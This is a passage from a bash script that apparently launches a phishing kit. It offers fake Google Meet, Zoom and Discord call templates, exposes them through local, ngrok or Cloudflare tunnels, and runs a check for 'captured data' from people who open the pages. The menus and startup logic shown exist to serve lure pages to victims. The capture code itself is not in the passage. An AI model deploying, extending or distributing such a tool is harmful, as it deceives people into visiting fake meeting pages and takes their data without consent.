      echo -e "${GREEN}${BOLD}[${WHITE}+${GREEN}${BOLD}] Web server running. Open your browser to http://$HOST:$PORT\e[0m"
      checkfound # Start checking for captured data
      ;;
    2 | 02)
      ngrok_server;;
    3 | 03)
      cloudflare_tunnel;;
    *)
      printf "\n${RED} Invalid Option, Try Again..."
      { sleep 1; tunnel_menu; };;
  esac
}

## Main Menu
main_menu() {
  { clear; banner; echo; }

  printf "${RED}Select a Template to Use:\n\n"

  printf " ${WHITE}| ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet   ${WHITE}| \n"
  printf " ${WHITE}| ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call     ${WHITE}| \n"
  printf " ${WHITE}| ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call  ${WHITE}| \n\n"

  printf " ${WHITE}| ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About         ${WHITE}| \n"
  printf " ${WHITE}| ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit          ${WHITE}| \n\n"

  read -p "  ${BRIGHT_GREEN}Select an option: "

  case $REPLY in
    1 | 01)
      printf "\n${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting Google Meet Template...\e[0m\n"
      tunnel_menu;;
    2 | 02)
      printf "\n${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting Zoom Template...\e[0m\n"
      tunnel_menu;;
    3 | 03)
      printf "\n${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting Discord Template...\e[0m\n"
      tunnel_menu;;
    99)
      about;;
    0 | 00)
      msg_exit;;
    *)
      printf "\n${RED} Invalid Option, Try Again..."
      { sleep 1; main_menu; };;
  esac
}

## Main
# Load HOST and PORT from file, if it exists
if [ -f config.conf ]; then
  source config.conf
fi

## Main Script
kill_pid
dependencies
check_status
main_menu
